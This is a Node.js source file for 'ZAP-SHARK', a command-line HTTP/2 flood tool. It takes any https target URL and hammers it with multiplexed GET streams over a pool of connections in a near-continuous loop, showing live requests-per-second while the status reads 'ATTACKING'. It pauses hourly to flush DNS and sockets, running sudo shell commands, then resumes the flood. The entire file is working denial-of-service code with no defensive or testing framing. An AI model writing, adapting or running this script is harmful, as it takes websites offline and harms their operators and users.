const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // MAX H2 ABUSE - CAREFUL OPTIMIZATION
        this.connectionPool = [];
        this.poolSize = 5; // Multiple connections for true multiplexing
        this.activeStreams = 0;
        this.maxStreamsPerConn = 100;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
    }

    setupConnections() {
        // Create multiple H2 connections carefully
        for (let i = 0; i < this.poolSize; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl);
                    client.setMaxListeners(100);
                    
                    client.on('error', () => {
                        // Silent fail - don't spam reconnects
                    });
                    
                    client.on('remoteSettings', (settings) => {
                        if (settings.maxConcurrentStreams) {
                            this.maxStreamsPerConn = Math.min(settings.maxConcurrentStreams, 100);
                        }
                    });
                    
                    this.connectionPool.push(client);
                } catch (err) {
                    // Don't break on connection errors
                }
            }, i * 100); // Stagger connections
        }
    }

    sendRequest() {
        if (this.connectionPool.length === 0) return;

        // Use available connections carefully
        const availableStreams = (this.maxStreamsPerConn * this.connectionPool.length) - this.activeStreams;
        const streamsThisTick = Math.min(availableStreams, 3); // Conservative multiplexing
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/'
                });
                
                req.on('response', () => {
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
        }
    }

    flushSockets() {
        // Carefully close all connections
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (err) {
                // Ignore cleanup errors
            }
        });
        this.connectionPool = [];
        this.activeStreams = 0;
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.setupConnections();
                setTimeout(() => this.startAttack(), 1000);
            }, this.maintenanceDuration);
        }
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRequest();
                this.updateDisplay();
            }
        }, 0.1);
    }

    start() {
        this.lastMaintenance = Date.now();
        
        console.log("=== ZAP-SHARK MAX H2 ===");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(40));
        
        this.setupConnections();
        
        // Wait for connections to establish
        setTimeout(() => {
            this.startAttack();
        }, 2000);
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Connection health check - careful replenishment
        setInterval(() => {
            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                this.setupConnections();
            }
        }, 10000);
        
        process.on('SIGINT', () => {
            this.running = false;
            if (this.attackInterval) clearInterval(this.attackInterval);
            this.flushSockets();
            console.log('\n=== ZAP-SHARK STOPPED ===');
            process.exit(0);
        });
    }
}

// Safe usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start();
